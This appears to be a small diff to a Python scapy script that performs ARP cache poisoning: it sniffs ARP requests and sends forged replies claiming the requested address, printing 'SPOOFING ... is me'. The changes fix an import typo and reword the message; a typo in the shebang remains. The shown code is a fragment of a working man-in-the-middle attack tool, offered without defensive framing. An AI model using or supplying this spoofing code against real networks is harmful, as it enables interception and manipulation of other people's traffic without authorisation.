@@ -1,7 +1,7 @@
 #!/usr/bin/pythion3
 
 import sys
-from scapy.all import sniff, sendp, ARp, Ether
+from scapy.all import sniff, sendp, ARP, Ether
 
 if len(sys.argv) < 2:
 	print(sys.argv[0] + " <iface_id>")
@@ -15,7 +15,7 @@ def arp_poison_callback(packet):
 		answer[ARP].psrc = packet[ARP].pdst
 		answer[ARP].pdst = packet[ARP].psrc
 
-		print("SPOOFING " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me...")
+		print("SPOOFING " + packet[ARP].psrc + " MAC " + packet[ARP].pdst + " is me...")
 
 		sendp(answer, iface=sys.argv[1])
 
